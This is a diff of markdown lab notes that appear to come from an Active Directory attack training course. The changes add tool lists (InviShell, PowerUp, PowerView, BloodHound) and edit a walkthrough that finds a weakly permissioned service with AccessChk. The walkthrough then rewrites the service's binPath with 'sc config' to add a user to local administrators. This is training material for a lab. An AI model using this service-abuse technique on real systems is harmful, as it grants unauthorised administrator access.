@@ -8,6 +8,11 @@
 
 - Exploit a service on `student51` and elevate privileges to local administrator
 
+#### Tools
+
+- `InviShell`
+- `PowerUp` (alternative: `AccessChk` + `sc`)
+
 #### Solution
 
 - Exploit a service on `student51` and elevate privileges to local administrator
@@ -64,6 +69,8 @@ US\studentuser51
 
 **AccessChk**
 
+The same attack can be executed with `accessch64.exe` from Sysinternals.
+
 ```
 PS C:\AD\Tools> C:\AD\Tools\AccessChk\accesschk64.exe -uwcqv 'studentuser51' *
 
@@ -79,7 +86,7 @@ We can see that the `studentuser51` has Full Permissions on ALG service.
 Let's abuse the permissions manually.
 
 ```
-PS C:\AD\Tools> sc.exe config ALG binPath= "net localgroup administrators us\studentuserx /add"
+PS C:\AD\Tools> sc config ALG binPath= "net localgroup administrators us\studentuserx /add"
 
 [SC] ChangeServiceConfig SUCCESS
 ```
@@ -94,6 +101,12 @@ PS C:\AD\Tools> sc.exe config ALG binPath= "net localgroup administrators us\stu
 #### Tasks
 
 - Identify a machine in the domain where `studentuser51` has local administrative access due to group membership
+
+#### Tools
+
+- `PowerView` (alternative: `ADModule`)
+- `winrs` (alternative: `Enter-PSSession`)
+- `BloodHound`
 
 #### Solution
 
@@ -116,7 +129,8 @@ Let's enumerate group memberships for `studentuser51`.
 
 **AD Module**
 
-The ActiveDirectory module command `Get-ADPrinicpalGroupMemebsrhip` does not provide ability to recursively look for group membership. Therefore, we can use the following simple PowerShell code from InvisiShell.
+⚠️ The ActiveDirectory module command `Get-ADPrinicpalGroupMemebsrhip` does not provide ability to recursively look for group membership.
+⭐ Therefore, we can use the following simple PowerShell code from InvisiShell.
 
 ```powershell
 function Get-ADPrincipalGroupMembershipRecursive ($SamAccountName)
